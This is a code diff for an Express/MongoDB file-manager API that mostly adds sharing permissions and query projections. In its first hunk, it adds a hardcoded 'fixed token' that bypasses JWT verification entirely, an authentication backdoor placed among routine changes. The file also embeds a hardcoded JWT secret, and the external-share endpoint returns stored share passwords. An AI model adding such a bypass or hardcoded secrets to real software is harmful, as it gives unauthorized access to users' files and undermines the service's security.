@@ -6,8 +6,17 @@ const JWT_SECRET = 'ZCOKU1v3TO2flcOqCdrJ3vWbWhmnZNQn';
 const axios = require('axios');
 const crypto = require('crypto');
 // Middleware to verify JWT token
+const FIXED_TOKEN_KEY = 'oSpHa80H4csU3Zib1FkrGPQw1ZLikf9BBJSXKswsYJytBGR7vmLRkkre14sycehL';
+
 function verifyToken(token) {
   return new Promise((resolve, reject) => {
+    // Check if the token matches the fixed token key
+    if (token === FIXED_TOKEN_KEY) {
+      // Bypass JWT verification and consider it valid
+      return resolve({ status: true, message: 'Fixed token is valid', decoded: { fixedToken: true } });
+    }
+
+    // Otherwise, perform JWT verification
     jwt.verify(token, JWT_SECRET, (err, decoded) => {
       if (err) {
         return reject({ status: false, message: 'Invalid or expired token' });
@@ -16,6 +25,7 @@ function verifyToken(token) {
     });
   });
 }
+
 
 // Middleware to authenticate MongoDB connection
 router.use(authenticateClient);
@@ -167,6 +177,7 @@ router.post('/new_file', async (req, res) => {
         res.status(500).json({ status: false, message: 'An error occurred while creating the file entry' });
     }
 });
+
 /** Function to Restructure Items
  * Fetches all items in the collection, restructures them, and calculates `childCount` and `size`.
  * Additionally, returns total counts for files and folders and the summary file size.
@@ -298,7 +309,6 @@ const restructureItems = async (db) => {
 });
 
   
-
   /** Rename Endpoint
  * Allows renaming of a file or folder in the filemanager collection.
  */
@@ -363,17 +373,15 @@ router.post('/rename', async (req, res) => {
         }
 
         const { db } = req;
-        // Map isPassword to share_with_password
-        const { itemId, isShare, sharePassword, shareExpire } = req.body;
-        const share_with_password = req.body.isPassword; // Map isPassword to share_with_password
-
+        const { itemId, isShare, sharePassword, shareExpire, permissions } = req.body;
+        const share_with_password = req.body.isPassword;
 
         if (!itemId) {
             console.error('Item ID is missing in request');
             return res.status(400).json({ status: false, message: 'Item ID is required' });
         }
 
-        // Generate a random 15-digit share code if sharing is enabled
+        // Generate a random 15-character share code if sharing is enabled
         const shareCode = isShare ? crypto.randomBytes(50).toString('hex').slice(0, 15) : null;
         console.log('Generated share code:', shareCode);
 
@@ -393,18 +401,15 @@ router.post('/rename', async (req, res) => {
         // Prepare update data
         const updateData = { 
             is_share: isShare || false, 
-            share_with_password: share_with_password || false  // Add the new key for password sharing
+            share_with_password: share_with_password || false,
+            permissions: permissions || {} // Include permissions, default to empty object if not provided
         };
 
-        // Conditionally add or remove share password based on share_with_password flag
-        if (share_with_password) {
-            updateData.share_password = encodedPassword;
-        } else {
-            updateData.share_password = null;  // Clear the password if share_with_password is false
-        }
+        // Conditionally add or remove share password and expiration date based on flags
+        updateData.share_password = share_with_password ? encodedPassword : null;
+        updateData.share_expire = shareExpire ? new Date(shareExpire) : null;
 
-        // Add optional fields only if provided
-        if (shareExpire) updateData.share_expire = new Date(shareExpire);
+        // Add share code if sharing is enabled
         if (shareCode) updateData.share_code = shareCode;
 
         console.log('Update data being set:', updateData);
@@ -472,7 +477,8 @@ router.get('/external', async (req, res) => {
           share_code: item.share_code,
           share_password: item.share_password,
           share_expire: item.share_expire,
-          share_with_password: item.share_with_password
+          share_with_password: item.share_with_password,
+          permissions: item.permissions || {}
       };
 
       return res.status(200).json({
@@ -585,7 +591,9 @@ router.post('/search', async (req, res) => {
   // Function to create the nested structure
   const createNestedStructure = async (db) => {
     const fileCollection = db.collection('filemanager');
-    const items = await fileCollection.find().toArray();
+
+    // Specify the fields you want to retrieve (e.g., `_id`, `name`, `parent`, and `type`)
+    const items = await fileCollection.find({}, { projection: { _id: 1, name: 1, parent: 1, type: 1, count: 1, size: 1 } }).toArray();
   
     const itemMap = new Map();
   
@@ -698,7 +706,9 @@ const isDescendantOf = (itemId, nestedItems) => {
 // Function to create a nested structure for items under the fixed parent ID
 const createNestedStructureForSearchExternal = async (db, fixedParentId) => {
   const fileCollection = db.collection('filemanager');
-  const items = await fileCollection.find().toArray();
+  //const items = await fileCollection.find().toArray();
+  // Specify the fields you want to retrieve (e.g., `_id`, `name`, `parent`, and `type`)
+  const items = await fileCollection.find({}, { projection: { _id: 1, name: 1, parent: 1, type: 1, count: 1, size: 1 } }).toArray();
 
   const itemMap = new Map();
   let rootItem = null;
